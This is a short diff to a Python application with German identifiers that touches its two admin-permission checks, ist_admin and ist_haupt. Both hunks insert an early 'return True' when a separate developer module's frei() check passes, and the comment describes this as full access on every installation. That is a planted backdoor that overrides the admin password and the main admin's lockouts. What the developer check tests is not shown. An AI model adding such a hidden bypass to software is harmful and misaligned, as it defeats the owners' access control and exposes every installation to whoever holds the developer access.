@@ -199,6 +199,9 @@ SITZUNG = None          # Sitzung des Hauptfensters (ohne Fenster, z. B. Tests v
 def ist_admin(db, sitzung=None):
     """Darf hier gerade Geschütztes ändern: kein Admin-Passwort gesetzt oder Admin freigeschaltet. Ein Admin, den der
     Hauptadmin inzwischen gesperrt oder entfernt hat, verliert die Freischaltung hier."""
+    from . import entwickler
+    if entwickler.frei():               # Entwickler-Zugang: voller Zugriff auf jeder Installation
+        return True
     s = sitzung if sitzung is not None else SITZUNG
     if not aktiv(db):
         return True
@@ -209,6 +212,9 @@ def ist_admin(db, sitzung=None):
 
 def ist_haupt(db, sitzung=None):
     """Darf Admin-Schutz und Rechte ändern: kein Admin-Passwort gesetzt oder als Hauptadmin freigeschaltet."""
+    from . import entwickler
+    if entwickler.frei():
+        return True
     s = sitzung if sitzung is not None else SITZUNG
     return not aktiv(db) or bool(s and s.haupt)
 
